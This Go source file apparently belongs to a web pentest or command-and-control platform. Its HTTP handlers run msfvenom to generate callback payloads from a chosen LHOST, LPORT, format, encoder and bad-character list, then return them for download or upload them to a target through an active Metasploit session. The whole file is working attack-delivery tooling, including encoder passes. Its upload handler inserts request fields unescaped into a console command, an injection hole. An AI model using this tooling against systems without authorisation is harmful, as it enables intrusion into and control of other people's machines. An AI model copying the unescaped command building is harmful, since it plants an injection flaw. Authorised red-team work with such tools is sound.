package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
)

var msfvenomExtensions = map[string]string{
	"exe":    ".exe",
	"dll":    ".dll",
	"elf":    ".elf",
	"macho":  "",
	"asp":    ".asp",
	"aspx":   ".aspx",
	"jsp":    ".jsp",
	"war":    ".war",
	"php":    ".php",
	"py":     ".py",
	"rb":     ".rb",
	"sh":     ".sh",
	"ps1":    ".ps1",
	"psh":    ".ps1",
	"apk":    ".apk",
	"jar":    ".jar",
	"raw":    ".bin",
	"hex":    ".hex",
	"base64": ".b64",
}

func msfvenomExt(format string) string {
	if ext, ok := msfvenomExtensions[strings.ToLower(format)]; ok {
		return ext
	}
	return ".bin"
}

func buildMsfvenomArgs(payload, lhost string, lport int, format, encoder, badChars string, iterations int, outFile string) []string {
	args := []string{
		"-p", payload,
		fmt.Sprintf("LHOST=%s", lhost),
		fmt.Sprintf("LPORT=%d", lport),
		"-f", format,
		"-o", outFile,
	}
	// Note: -a (arch) is intentionally omitted — the payload name encodes the
	// architecture (e.g. linux/x64/...) and passing -a causes msfvenom to
	// reject payloads where the explicit flag doesn't match its internal arch.
	if encoder != "" {
		args = append(args, "-e", encoder)
		if iterations > 1 {
			args = append(args, "-i", strconv.Itoa(iterations))
		}
	}
	if badChars != "" {
		args = append(args, "-b", badChars)
	}
	return args
}

type msfvenomReq struct {
	Payload    string `json:"payload"`
	LHOST      string `json:"lhost"`
	LPORT      int    `json:"lport"`
	Format     string `json:"format"`
	Arch       string `json:"arch"`
	Encoder    string `json:"encoder"`
	BadChars   string `json:"bad_chars"`
	Iterations int    `json:"iterations"`
}

func parseMsfvenomReq(r *http.Request) (msfvenomReq, error) {
	var req msfvenomReq
	if err := parseJSON(r, &req); err != nil {
		return req, err
	}
	if req.Payload == "" || req.LHOST == "" || req.LPORT == 0 {
		return req, fmt.Errorf("payload, lhost and lport required")
	}
	if req.Format == "" {
		req.Format = "raw"
	}
	if req.Iterations < 1 {
		req.Iterations = 1
	}
	return req, nil
}

// handleMsfvenomGenerate runs msfvenom and returns the payload as a binary download.
func handleMsfvenomGenerate(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			http.Error(w, `{"error":"invalid session id"}`, http.StatusBadRequest)
			return
		}
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"unauthorized"}`)
			return
		}
		if _, err := db.GetSession(sessionID, claims.UserID); err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			fmt.Fprint(w, `{"error":"session not found"}`)
			return
		}

		req, err := parseMsfvenomReq(r)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprintf(w, `{"error":%q}`, err.Error())
			return
		}

		ext := msfvenomExt(req.Format)
		tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("msf_payload_%d%s", time.Now().UnixNano(), ext))
		defer os.Remove(tmpFile)

		args := buildMsfvenomArgs(req.Payload, req.LHOST, req.LPORT, req.Format, req.Encoder, req.BadChars, req.Iterations, tmpFile)
		cmd := exec.Command("msfvenom", args...)
		cmd.Env = msfEnv()
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		cmd.Stdout = &stderr // msfvenom writes info to stdout too

		if err := cmd.Run(); err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			msg := strings.TrimSpace(stderr.String())
			if msg == "" {
				msg = err.Error()
			}
			fmt.Fprintf(w, `{"error":%q}`, msg)
			return
		}

		data, err := os.ReadFile(tmpFile)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":"could not read payload: %v"}`, err)
			return
		}

		filename := "payload" + ext
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
		w.Write(data)
	}
}

// handleMsfvenomUpload generates a payload and uploads it to the target via an active MSF session.
func handleMsfvenomUpload(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")

		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"unauthorized"}`)
			return
		}
		if _, err := db.GetSession(sessionID, claims.UserID); err != nil {
			w.WriteHeader(http.StatusNotFound)
			fmt.Fprint(w, `{"error":"session not found"}`)
			return
		}

		var body struct {
			msfvenomReq
			MsfSessionID string `json:"msf_session_id"`
			RemotePath   string `json:"remote_path"`
		}
		if err := parseJSON(r, &body); err != nil || body.Payload == "" || body.LHOST == "" || body.LPORT == 0 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"payload, lhost, lport required"}`)
			return
		}
		if body.Format == "" {
			body.Format = "raw"
		}
		if body.Iterations < 1 {
			body.Iterations = 1
		}
		if body.MsfSessionID == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"msf_session_id required"}`)
			return
		}
		if body.RemotePath == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"remote_path required"}`)
			return
		}

		ext := msfvenomExt(body.Format)
		tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("msf_payload_%d%s", time.Now().UnixNano(), ext))
		defer os.Remove(tmpFile)

		args := buildMsfvenomArgs(body.Payload, body.LHOST, body.LPORT, body.Format, body.Encoder, body.BadChars, body.Iterations, tmpFile)
		genCmd := exec.Command("msfvenom", args...)
		genCmd.Env = msfEnv()
		var genStderr bytes.Buffer
		genCmd.Stderr = &genStderr
		genCmd.Stdout = &genStderr

		if err := genCmd.Run(); err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			msg := strings.TrimSpace(genStderr.String())
			if msg == "" {
				msg = err.Error()
			}
			fmt.Fprintf(w, `{"error":%q}`, msg)
			return
		}

		executor := GetExecutor(sessionID)
		if executor == nil {
			w.WriteHeader(http.StatusConflict)
			fmt.Fprint(w, `{"error":"Console not initialised — open the Console tab first"}`)
			return
		}

		uploadCmd := fmt.Sprintf(`sessions -i %s -c "upload %s %s"`, body.MsfSessionID, tmpFile, body.RemotePath)
		connID, subChan := executor.Subscribe()
		defer executor.Unsubscribe(connID)

		if err := executor.ExecuteCommand(uploadCmd); err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":%q}`, err.Error())
			return
		}

		var lines []string
		deadline := time.After(30 * time.Second)
		idle := time.NewTimer(3 * time.Second)
		defer idle.Stop()

	collect:
		for {
			select {
			case line, ok := <-subChan:
				if !ok {
					break collect
				}
				lines = append(lines, line)
				idle.Reset(3 * time.Second)
			case <-idle.C:
				break collect
			case <-deadline:
				break collect
			}
		}

		type uploadResp struct {
			Output     string `json:"output"`
			LocalPath  string `json:"local_path"`
			RemotePath string `json:"remote_path"`
		}
		resp := uploadResp{
			Output:     strings.Join(lines, "\n"),
			LocalPath:  tmpFile,
			RemotePath: body.RemotePath,
		}
		if data, err := json.Marshal(resp); err == nil {
			w.Write(data)
		}
	}
}
